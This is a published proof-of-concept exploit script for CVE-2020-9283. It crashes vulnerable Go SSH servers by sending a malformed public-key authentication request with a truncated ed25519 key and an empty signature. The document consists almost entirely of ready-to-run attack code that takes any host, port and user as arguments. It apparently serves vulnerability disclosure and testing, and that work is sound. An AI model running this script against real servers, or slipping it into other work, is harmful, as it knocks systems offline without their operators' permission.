# Exploit Title: Go SSH servers 0.0.2 - Denial of Service (PoC)
# Author: Mark Adams
# Date: 2020-02-21
# Link: https://github.com/mark-adams/exploits/blob/master/CVE-2020-9283/poc.py
# CVE: CVE-2020-9283
#
# Running this script may crash the remote SSH server if it is vulnerable.
# The GitHub repository contains a vulnerable and fixed SSH server for testing.
#
# $ python poc.py
# ./poc.py <host> <port> <user>
#
# $ python poc.py localhost 2022 root
# Malformed auth request sent. This should cause a panic on the remote server.
#

#!/usr/bin/env python

import socket
import sys

import paramiko
from paramiko.common import cMSG_SERVICE_REQUEST, cMSG_USERAUTH_REQUEST

if len(sys.argv) != 4:
    print('./poc.py <host> <port> <user>')
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
user = sys.argv[3]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

t = paramiko.Transport(sock)
t.start_client()

t.lock.acquire()
m = paramiko.Message()
m.add_byte(cMSG_SERVICE_REQUEST)
m.add_string("ssh-userauth")
t._send_message(m)

m = paramiko.Message()
m.add_byte(cMSG_USERAUTH_REQUEST)
m.add_string(user)
m.add_string("ssh-connection")
m.add_string('publickey')
m.add_boolean(True)
m.add_string('ssh-ed25519')

# Send an SSH key that is too short (ed25519 keys are 32 bytes)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x15key-that-is-too-short')

# Send an empty signature (the server won't get far enough to validate it)
m.add_string(b'\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x00')

t._send_message(m)

print('Malformed auth request sent. This should cause a panic on the remote server.')